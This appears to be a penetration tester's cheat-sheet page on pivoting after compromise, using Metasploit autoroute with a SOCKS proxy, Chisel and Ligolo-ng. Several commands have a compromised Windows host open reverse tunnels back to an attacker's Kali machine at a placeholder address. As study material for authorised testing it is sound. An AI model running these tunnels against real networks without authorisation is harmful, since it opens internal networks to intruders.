---
layout:     post
author:     0x5c4r3
type: docs
permalink: Port_Forward
---

<span style="font-size: 35px; color:red"><b>Port Forward</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Metasploit</b></span>
Once you get the meterpreter session running:
```shell
use multi/manage/autoroute
```
set CMD audoadd and SESSION and 
```shell
use auxiliary/server/socks_proxy
```
with SRVPORT 1080 and VERSION 5.

Then run commands with <span style="color:red">proxychains4</span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Chisel</b></span>
On Kali:
```shell
chisel server --reverse -port 8080
```
On Windows:
```shell
chisel.exe client <kali_ip>:8080 R:1080:socks
```

&nbsp;

---
&nbsp;

<span style="font-size: 25px; color:white"><b>Ligolo-ng</b></span>
VPN-like port forwarding.

Config:
```shell
sudo ip tuntap add user scare mode tun ligolo && sudo ip link set ligolo up
```

On Linux:
```shell
./proxy -selfcert
```

On Windows, upload <span style="color:red">agent.exe</span> and <span style="color:red">wintun.dll</span> and run:
```shell
agent.exe -connect <kali_ip>:11601 -ignore-cert
```

Once you get the session running, from <span style="color:red">proxy</span> run <span style="color:red">session</span> and select the right session, then run <span style="color:red">ifconfig</span> to check the interface (I.E. if the interface is <span style="color:red">192.168.0.30/24</span>):
```shell
sudo ip route add 192.168.0.0/24 dev ligolo
```
Add other routes in case the internal network has other reachable subnets.
Then run <span style="color:red">start</span>. No need to use <span style="color:red">proxychains</span>.
